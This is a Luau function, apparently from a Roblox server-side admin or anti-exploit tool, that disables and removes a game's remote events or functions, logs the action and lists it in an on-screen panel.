function firewallRemote(entry)
    local rem = entry.inst
    if not rem or not rem.Parent then log("WARN","Firewall skip — gone: "..(entry.path or "?")); return end
    local ok, err = pcall(function()
        if rem:IsA("RemoteEvent")    then rem.OnServerEvent:Connect(function() end)
        elseif rem:IsA("RemoteFunction") then rem.OnServerInvoke=function() return nil end end
        rem.Parent=nil
    end)
    if ok then
        local fw={path=entry.path,class=entry.class,time=ts()}
        S.firewalled = S.firewalled or {}; S.firewalled[#S.firewalled+1]=fw
        log("OK","Firewalled: "..entry.path)
        local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,24); row.BackgroundColor3=Color3.fromRGB(14,26,14); row.BorderSizePixel=0; row.Parent=FWList; corner(row,4)
        local c=lbl(row,"["..fw.class.."]",11,T.OK,Enum.Font.Code); c.Size=UDim2.new(0,115,1,0); c.Position=UDim2.new(0,6,0,0)
        local p=lbl(row,fw.path,11,T.TXT,Enum.Font.Code); p.Size=UDim2.new(0,355,1,0); p.Position=UDim2.new(0,124,0,0)
        local t_=lbl(row,fw.time,11,T.TXM,Enum.Font.Code); t_.Size=UDim2.new(0,80,1,0); t_.Position=UDim2.new(0,490,0,0)
    else
        log("WARN","Firewall failed "..entry.path..": "..tostring(err))
    end
end

